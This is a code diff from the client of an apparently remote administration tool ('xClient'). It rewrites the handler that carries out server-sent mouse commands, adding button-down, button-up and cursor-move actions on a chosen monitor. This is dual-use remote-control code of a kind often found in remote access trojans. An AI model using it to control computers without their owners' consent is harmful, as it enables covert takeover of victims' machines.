@@ -100,21 +100,27 @@ namespace xClient.Core.Commands
             }).Start();
         }
 
-        public static void HandleDoMouseClick(Packets.ServerPackets.DoMouseClick command, Client client)
+        public static void HandleDoMouseEvent(Packets.ServerPackets.DoMouseEvent command, Client client)
         {
             Screen[] allScreens = Screen.AllScreens;
             int offsetX = allScreens[command.MonitorIndex].Bounds.X;
             int offsetY = allScreens[command.MonitorIndex].Bounds.Y;
             Point p = new Point(command.X + offsetX, command.Y + offsetY);
 
-            if (command.LeftClick)
+            switch (command.Action)
             {
-                NativeMethodsHelper.DoMouseClickLeft(p, command.DoubleClick);
-            }
-            else
-            {
-                NativeMethodsHelper.DoMouseClickRight(p, command.DoubleClick);
-            }
+                case MouseAction.LeftDown:
+                case MouseAction.LeftUp:
+                    NativeMethodsHelper.DoMouseEventLeft(p, command.IsMouseDown);
+                    break;
+                case MouseAction.RightDown:
+                case MouseAction.RightUp:
+                    NativeMethodsHelper.DoMouseEventRight(p, command.IsMouseDown);
+                    break;
+                case MouseAction.MoveCursor:
+                    NativeMethodsHelper.DoMouseMoveCursor(p);
+                    break;
+            }       
         }
 
         public static void HandleGetMonitors(Packets.ServerPackets.GetMonitors command, Client client)
